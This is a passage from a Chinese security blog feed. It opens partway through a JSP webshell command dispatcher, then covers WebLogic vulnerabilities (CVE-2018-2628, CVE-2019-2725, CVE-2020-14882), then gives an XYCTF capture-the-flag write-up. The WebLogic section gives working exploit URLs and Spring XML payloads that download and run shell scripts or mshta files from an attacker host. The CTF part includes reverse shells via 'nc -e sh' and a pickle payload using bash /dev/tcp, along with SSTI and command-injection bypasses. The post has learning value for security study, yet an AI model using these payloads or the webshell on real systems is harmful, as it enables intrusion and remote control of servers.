            sb.append(&quot;1&quot;);
        &#125; else if (Z.equals(&quot;K&quot;)) &#123;
            KK(z1, z2);
            sb.append(&quot;1&quot;);
        &#125; else if (Z.equals(&quot;L&quot;)) &#123;
            LL(z1, z2);
            sb.append(&quot;1&quot;);
        &#125; else if (Z.equals(&quot;M&quot;)) &#123;
            String[] c &#x3D; &#123; z1.substring(2), z1.substring(0, 2), z2 &#125;;
            Process p &#x3D; Runtime.getRuntime().exec(c);
            MM(p.getInputStream(), sb);
            MM(p.getErrorStream(), sb);
        &#125; else if (Z.equals(&quot;N&quot;)) &#123;
            NN(z1, sb);
        &#125; else if (Z.equals(&quot;O&quot;)) &#123;
            OO(z1, sb);
        &#125; else if (Z.equals(&quot;P&quot;)) &#123;
            PP(z1, sb);
        &#125; else if (Z.equals(&quot;Q&quot;)) &#123;
            QQ(cs, z1, z2, sb,z2.indexOf(&quot;-to:&quot;)!&#x3D;-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\\\&quot;, &quot;&#x2F;&quot;)+&quot;images&#x2F;&quot;);
        &#125;
    &#125; catch (Exception e) &#123;
        sb.append(&quot;ERROR&quot; + &quot;:&#x2F;&#x2F; &quot; + e.toString());
    &#125;
    sb.append(&quot;|&quot; + &quot;&lt;-&quot;);
    out.print(sb.toString());
&#125;
%&gt;</code></pre>
<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>Weblogic Server WLS Core Components反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过T3协议触发，可导致未授权的用户在远程服务器执行任意命令。<br><strong>受影响版本</strong></p>
<pre class="language-none"><code class="language-none">Weblogic 10.3.6.0
Weblogic 12.1.3.0
Weblogic 12.2.1.2
Weblogic 12.2.1.3</code></pre>
<p>网上有很多复现文章，这里不复现了。<br><a href="https://www.freebuf.com/vuls/169420.html">https://www.freebuf.com/vuls/169420.html</a><br><a href="https://xz.aliyun.com/t/8073?time__1311=n4+xuDgDBADQYAKD=DODlcje0=eYfS7q+ArD&alichlgref=https://cn.bing.com/">https://xz.aliyun.com/t/8073?time__1311=n4%2BxuDgDBADQYAKD%3DDODlcje0%3DeYfS7q%2BArD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a><br><a href="https://blog.csdn.net/weixin_45744814/article/details/120229347">https://blog.csdn.net/weixin_45744814/article/details/120229347</a><br><strong>漏洞修复</strong></p>
<ol>
<li>关闭或控制T3服务的访问权限</li>
<li>更新补丁</li>
</ol>
<h2 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h2><p>由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意HTTP请求，利用该漏洞获取服务器权限，实现远程代码执行.<br><strong>影响版本</strong></p>
<pre class="language-none"><code class="language-none">Oracle WebLogic Server 10.*
Oracle WebLogic Server 12.1.3</code></pre>
<p><strong>影响组件</strong></p>
<pre class="language-none"><code class="language-none">bea_wls9_async_response.war
wsat.war</code></pre>
<p><strong>漏洞判断</strong><br>判断不安全组件是否开启<br>通过访问路径<code>/_async/AsyncResponseService</code><br><strong>漏洞利用</strong><br><a href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a><br><strong>漏洞修复</strong></p>
<ol>
<li>打上官方补丁</li>
<li>升级本地JDK版本，升级到jdk7u21以上版本可以避免由于java原生类反序列化漏洞造成的RCE</li>
<li>配置URL访问资源策略</li>
<li>删除不安全文件，删除wls9_async_response.war与wls-wsat.war文件及相关文件夹并重启Weblogic服务<br>具体文件路径：<br>10.3.*版本<pre class="language-none"><code class="language-none">\Middleware\wlserver_10.3\server\lib\%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\</code></pre>
12.1.3版本<pre class="language-none"><code class="language-none">Middleware\Oracle_Home\oracle_common\modules\%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\</code></pre></li>
</ol>
<h2 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h2><p>这个漏洞的利用方式有两种:</p>
<ol>
<li>通过<code>com.tangosol.coherence.mvel2.sh.ShellSession执行命令</code><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;whoami&#39;);&quot;)</code></pre>
这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类。<br>反弹shell<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;curl http:&#x2F;&#x2F;vps:port&#x2F;shell.sh -o &#x2F;tmp&#x2F;shell.sh&#39;);&quot;)</code></pre></li>
</ol>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;139.155.49.43:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;bash&#x2F;tmp&#x2F;shell.sh&#39;);&quot;)</code></pre>
<ol start="2">
<li>通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code><br>windows WebLogic Server版本:10.3.6.0</li>
</ol>
<p><strong>cmd.xml</strong></p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;
&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;
  xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;&lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot; init-method&#x3D;&quot;start&quot;&gt;
&lt;constructor-arg&gt;
    &lt;list&gt;
        &lt;value&gt;cmd&lt;&#x2F;value&gt;
        &lt;value&gt;&#x2F;c&lt;&#x2F;value&gt;
        &lt;value&gt;&lt;![CDATA[mshta http:&#x2F;&#x2F;vps:port&#x2F;file.ext]]&gt;&lt;&#x2F;value&gt;
    &lt;&#x2F;list&gt;
&lt;&#x2F;constructor-arg&gt;
&lt;&#x2F;bean&gt;
&lt;&#x2F;beans&gt;  </code></pre>
<p><strong>GET</strong>方法:</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;..%2fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(&quot;http:&#x2F;&#x2F;vps:port&#x2F;cmd.xml&quot;)</code></pre>
<p><strong>POST</strong>方法:</p>
<pre class="language-none"><code class="language-none">url：
http:&#x2F;&#x2F;192.168.78.105:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal


body:
_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(&quot;http:&#x2F;&#x2F;vps:port&#x2F;cmd.xml&quot;)</code></pre>

<p>Linux WebLogic Server 版本:12.2.1.3</p>
<p>构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上</p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;
&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;
  xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;
&lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot; init-method&#x3D;&quot;start&quot;&gt;
&lt;constructor-arg&gt;
&lt;list&gt;
&lt;value&gt;bash&lt;&#x2F;value&gt;
&lt;value&gt;-c&lt;&#x2F;value&gt;
&lt;value&gt;&lt;!
[CDATA[curl vps:port&#x2F;shell.sh -o &#x2F;tmp&#x2F;shell.sh]]&gt;&lt;&#x2F;value&gt;
&lt;&#x2F;list&gt;
&lt;&#x2F;constructor-arg&gt;
&lt;&#x2F;bean&gt;
&lt;&#x2F;beans&gt;</code></pre>
<p>然后让Weblogic加载XML并执行其中的命令</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;vps:port&#x2F;shell.xml&quot;)</code></pre>
<p><strong>漏洞修复</strong><br>关闭后台对&#x2F;console&#x2F;console.portal对外访问</p>
]]></content>
      <categories>
        <category>中间件漏洞</category>
      </categories>
      <tags>
        <tag>Weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>XYCTF个人wp</title>
    <url>/posts/545cd3ac/</url>
    <content><![CDATA[<p>图片直接从记录的word里面导出来的有点模糊😓<br>由于个人实力较菜加之空余时间较少，只出了这几个题流&#x2F;(ㄒoㄒ)&#x2F;~~</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>首先用gc机制绕过抛出异常然后构造<code>call_user_func</code><br>用<code>end</code>函数返回数组最后一个元素的值<br>数组最后一组构造成system<br><code>call_user_func($a,$d)</code>就变成了system<br>然后$c就可以执行命令了,复制成cat &#x2F;f*<br><code>$d</code>给个空值<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEJlP.png" alt="OpEJlP.png" loading="lazy"><br>注意修改属性大小<br><img src="https://ooo.0x0.ooo/2024/04/28/OpERTb.png" alt="OpERTb.png" loading="lazy"></p>
<h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h2><p>输入help发现有个source指令，可以用来读取文件<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEtZl.png" alt="OpEtZl.png" loading="lazy"><br>直接 <code>source f*</code>读取flag<br><img src="https://ooo.0x0.ooo/2024/04/28/OpE4cg.png" alt="OpE4cg.png" loading="lazy"></p>
<h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h2><p>测试发现nc没被ban,直接nc vps port -e sh拿到shell<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEHOB.png" alt="OpEHOB.png" loading="lazy"></p>
<h2 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h2><p>直接搜两个md5值相同的文件<br>搜到一个网站<br><a href="https://natmchugh.blogspot.com/2014/10/how-i-created-two-images-with-same-md5.html">https://natmchugh.blogspot.com/2014/10/how-i-created-two-images-with-same-md5.html</a><br>将两个文件上传即可</p>
<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>第一步简单绕过<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEwdr.png" alt="OpEwdr.png" loading="lazy"><br>第二步preg_replace命令执行<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGOaM.png" alt="OpGOaM.png" loading="lazy"></p>
<h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>先去robots.txt<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEL7s.png" alt="OpEL7s.png" loading="lazy"><br>跟随<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEELK.png" alt="OpEELK.png" loading="lazy"><br>然后根据要求一一完成就行</p>
<blockquote>
<p>POST &#x2F;index.php HTTP&#x2F;1.1<br>Host: xyctf.top:42385<br>User-Agent: XYCTF<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 48<br>Origin: <a href="http://xyctf.top:42385/">http://xyctf.top:42385</a><br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Referer: yuanshen.com<br>Client-Ip: 127.0.0.1<br>Via: ymzx.qq.com<br>cookie: XYCTF</p>
<p>username&#x3D;XYCTF&amp;password&#x3D;%40JOILha%21wuigqi123%24</p>
</blockquote>
<h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><p><img src="https://ooo.0x0.ooo/2024/04/28/OpEGua.png" alt="OpEGua.png" loading="lazy"><br>想用echo 实现不了<br>用eval，先用%0d换行绕过注释符，然后用反引号执行指令缩减长度，然后%23注释后面的逗号，由于长度限制，使用$_GET再传个参,然后由于没有回显，用cp将flag传出来<br>f l a都被过滤，用<code>[@-z]</code>绕过<br>最终exp<br>cmd&#x3D;%0d<code>$_GET[1]</code>;%23&amp;1&#x3D;c\p &#x2F;[@-z][@-z][@-z]g 1<br>然后访问url&#x2F;1就能拿到flag</p>
<h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>第一关用个引用就能绕过<br><img src="https://ooo.0x0.ooo/2024/04/28/OpESzS.png" alt="OpESzS.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/28/OpE0PN.png" alt="OpE0PN.png" loading="lazy"><br>第二关也没难度,跟着构造就行<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEclC.png" alt="OpEclC.png" loading="lazy"><br>第三关有个原生类利用，用php伪协议就能读取所有文件了</p>
<pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// flag.php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">XYCTFNO1</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$Liu</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$T1ng</span><span class="token operator">=</span><span class="token string single-quoted-string">'yuroandCMD258'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$upsw1ng</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$crypto0</span><span class="token operator">=</span><span class="token string single-quoted-string">'dev1l'</span><span class="token punctuation">;</span>

    
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">XYCTFNO2</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$crypto0</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$adwa</span><span class="token punctuation">;</span>

   

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">XYCTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">adwa</span><span class="token operator">-></span><span class="token property">crypto0</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'dev1l'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">adwa</span><span class="token operator">-></span><span class="token property">T1ng</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yuroandCMD258'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">XYCTFNO3</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$KickyMu</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fpclose</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$N1ght</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"oSthing"</span><span class="token punctuation">;</span>



    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">XY</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">N1ght</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'oSthing'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"WOW, You web is really good!!!\n"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'X'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Y'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">KickyMu</span><span class="token operator">-></span><span class="token function">XYCTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">XY</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XYCTFNO3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">KickyMu</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XYCTFNO2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">KickyMu</span><span class="token operator">-></span><span class="token property">adwa</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XYCTFNO1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/04/28/OpEsTL.png" alt="OpEsTL.png" loading="lazy"></p>
<h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><p>爆破密码admin&#x2F;asdqwe<br>然后不知道如何时候尝试ssti发现<code>&#123;&#123;&#125;&#125;</code>都被过滤,xss测试可以弹窗<br>提示不能识别中文，输入中文发现会回显花括号，输入两个中文回显两对花括号，盲猜可以在两个中文后面模板注入，输入我去9+9发现回显18<br>然后就是用request绕过<br>然后发现还得用<code>&#123;%%&#125;</code>这种形式然后前面加上一个中文<br>并且测试发现attr request没被过滤<br>exp:<code>sentence=%E4%B8%80%print%20(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&amp;a=__globals__&amp;b=os&amp;c=cat%20/flag</code><br><img src="https://ooo.0x0.ooo/2024/04/28/OpEVvi.png" alt="OpEVvi.png" loading="lazy"></p>
<h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><p>只有数字发现可以用8进制绕过<br>但是无法执行有参数的指令<br>用两次here-strings绕过<br><code>exp: cmd=$0&lt;&lt;&lt;$0&lt;&lt;&lt;$&#39;\143\141\164\40\57\146\154\141\147&#39;</code><br><img src="https://ooo.0x0.ooo/2024/04/28/OpEYcX.png" alt="OpEYcX.png" loading="lazy"></p>
<h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><p>还是php原生类利用，不多赘述<br><img src="https://ooo.0x0.ooo/2024/04/28/OpElOt.png" alt="OpElOt.png" loading="lazy"></p>
<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><img src="https://ooo.0x0.ooo/2024/04/28/OpE9Nx.png" alt="OpE9Nx.png" loading="lazy"><br>在注册界面随便注册一个账号<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEjLj.png" alt="OpEjLj.png" loading="lazy"><br>可以看到RemberMe后面像是pickle反序列化<br>构造一手<br>测试发现reduce被过滤<br>参考文章<br><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a><br><a href="https://zhuanlan.zhihu.com/p/361349643">pickle反序列化的利用技巧总结 - 知乎 (zhihu.com)</a><br>exp：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
data<span class="token operator">=</span><span class="token triple-quoted-string string">b'''(cos
system
S'bash -c "bash -i >&amp; /dev/tcp/vps/port 0>&amp;1"'
o.'''</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/04/28/OpE2up.png" alt="OpE2up.png" loading="lazy"></p>
<h2 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h2><p><img src="https://ooo.0x0.ooo/2024/04/28/OpE8FU.png" alt="OpE8FU.png" loading="lazy"><br>想执行eval就需要截断掉后面的字符，使用<code>HALT_COMPILER()</code>函数<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEXPY.png" alt="OpEXPY.png" loading="lazy"><br>然后构造phar 序列化<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEu9v.png" alt="OpEu9v.png" loading="lazy"><br>生成exp.phar,上传测试发现只能上传jpg，并且过滤HALT_COMPILER,先用gzip加工一下<br>然后再修改成jpg后缀上传<br><img src="https://ooo.0x0.ooo/2024/04/28/OpE3Uq.png" alt="OpE3Uq.png" loading="lazy"><br>然后再class.php里面包含phar文件，又过滤了<code>phar://</code>头，使用<code>compress.zlib://phar://</code><br><img src="https://ooo.0x0.ooo/2024/04/28/OpECvc.png" alt="OpECvc.png" loading="lazy"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Sign1n签到"><a href="#Sign1n签到" class="headerlink" title="Sign1n签到"></a>Sign1n签到</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2

m<span class="token operator">=</span><span class="token number">12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567780112455778012234677900124556899112356679901344568891223556780113345788901245667900134456899023355788001344568991133566789112455688902335578800133467889112456679901245567991223557880013355689911334677891124556889122355788001245568990233566789112455779902335577801124457889112346779911344578801233467789112355779912234577990233556780113</span>
<span class="token keyword">def</span> custom_reduce<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">:</span>  
    input_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span>  
    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token operator">==</span><span class="token builtin">int</span><span class="token punctuation">(</span>input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span>
    result <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>
    <span class="token keyword">return</span> result
a<span class="token operator">=</span>custom_reduce<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">def</span> swap_bits<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">:</span> 
    input_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span> 
    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>  
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
        temp <span class="token operator">=</span> input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  
        input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> input_list<span class="token punctuation">[</span>length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> 
        input_list<span class="token punctuation">[</span>length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> temp  

    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>  
b<span class="token operator">=</span>swap_bits<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token keyword">while</span> b<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
s1<span class="token operator">=</span><span class="token string">'00'</span><span class="token operator">+</span>b
s11<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#print(int(s1,2))</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>s11<span class="token punctuation">)</span></code></pre>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="熊博士"><a href="#熊博士" class="headerlink" title="熊博士"></a>熊博士</h2><p>埃特巴什解码<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGaNG.png" alt="OpGaNG.png" loading="lazy"></p>
<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>谷歌搜图<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGoE1.png" alt="OpGoE1.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/28/OpGquI.png" alt="OpGquI.png" loading="lazy"><br><code>Papers,Please</code></p>
